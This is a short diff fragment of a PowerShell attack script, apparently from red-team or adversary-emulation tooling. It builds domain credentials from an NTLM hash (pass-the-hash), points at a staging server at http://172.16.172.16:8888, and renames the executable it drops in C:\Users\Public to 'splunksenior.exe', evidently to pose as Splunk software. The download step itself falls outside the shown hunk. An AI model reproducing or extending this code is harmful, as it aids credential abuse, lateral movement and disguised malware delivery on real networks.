@@ -6,7 +6,7 @@ $SecureNTLMHash = ConvertTo-SecureString -String $NTLMHash -AsPlainText -Force
 $Credential = New-Object System.Management.Automation.PSCredential("$DomainName\$UserName", $SecureNTLMHash)
 
 $server = "http://172.16.172.16:8888"
-$fileName = "new_file.exe"
+$fileName = "splunksenior.exe"
 $file = "C:\Users\Public\$fileName"
 
 if (Test-Path $file) {
